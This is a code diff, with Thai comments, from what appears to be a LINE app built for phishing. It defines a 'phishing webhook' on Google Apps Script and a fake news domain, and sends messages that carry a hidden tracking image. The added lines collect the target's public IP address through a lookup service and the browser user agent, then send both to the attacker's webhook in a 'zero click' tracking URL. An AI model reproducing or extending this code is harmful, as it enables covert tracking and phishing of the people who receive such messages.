@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzMdp64EwBFacfeVPLPYKbNECcw00CVzPxMbhUImExhV_giCAIQmSuYPGxINtpwtD2BzA/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbx6YdnaMBd6xNciRpMwnA-ik9K9U2oCgVAl5o5jTsvLFuGdSLo2O7s1ZO5EV3iIO9bmjQ/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -823,17 +823,38 @@
                 // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน Zero Click tracking URL
                 const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
                 
+                // ดึงข้อมูล IP ของเป้าหมายโดยใช้บริการ IP lookup (client-side)
+                let targetIP = "กำลังรอข้อมูล...";
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    if (ipResponse.ok) {
+                        const ipData = await ipResponse.json();
+                        targetIP = ipData.ip || "ไม่สามารถระบุได้";
+                        console.log("ได้รับ IP ของเป้าหมาย:", targetIP);
+                    }
+                } catch (ipError) {
+                    console.error("ไม่สามารถดึงข้อมูล IP ได้:", ipError);
+                    targetIP = "ไม่สามารถระบุได้";
+                }
+                
+                // ดึง User Agent ของเป้าหมาย (client-side)
+                const targetUA = navigator.userAgent || "ไม่สามารถระบุได้";
+                
                 // สร้าง URL สำหรับ Zero Click tracking พร้อมข้อมูลการติดตาม
-                // เปลี่ยนเพื่อให้ชัดเจนว่า creator และ name เป็นผู้สร้าง ไม่ใช่เป้าหมาย
+                // เพิ่มการส่งข้อมูล IP และ User Agent ของเป้าหมาย
                 let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick`;
                 zeroClickTrackUrl += `&key=${trackingKey}`;
                 zeroClickTrackUrl += `&case=${encodeURIComponent(caseName)}`;
-                zeroClickTrackUrl += `&creatorId=${encodeURIComponent(userId)}`; // เปลี่ยนจาก creator เป็น creatorId เพื่อความชัดเจน
-                zeroClickTrackUrl += `&creatorName=${encodeURIComponent(displayName)}`; // เปลี่ยนจาก name เป็น creatorName เพื่อความชัดเจน
-                zeroClickTrackUrl += `&isTarget=true`; // เพิ่มพารามิเตอร์สำคัญที่ระบุว่านี่เป็นการเรียกจากเป้าหมาย
-                zeroClickTrackUrl += `&r=${randomSuffix}`;  // ป้องกันการแคช
+                zeroClickTrackUrl += `&creatorId=${encodeURIComponent(userId)}`;
+                zeroClickTrackUrl += `&creatorName=${encodeURIComponent(displayName)}`;
+                zeroClickTrackUrl += `&isTarget=true`;
+                zeroClickTrackUrl += `&clientIP=${encodeURIComponent(targetIP)}`; // เพิ่ม IP ของเป้าหมาย
+                zeroClickTrackUrl += `&clientUA=${encodeURIComponent(targetUA)}`; // เพิ่ม User Agent ของเป้าหมาย
+                zeroClickTrackUrl += `&r=${randomSuffix}`;
                 
                 console.log("Zero Click Track URL:", zeroClickTrackUrl);
+                console.log("Client IP (target):", targetIP);
+                console.log("User Agent (target):", targetUA);
 
                 // สร้าง Flex Message ที่มีเฉพาะรูปภาพ แต่แทรก tracking image ขนาดเล็กที่มองไม่เห็น
                 const message = {
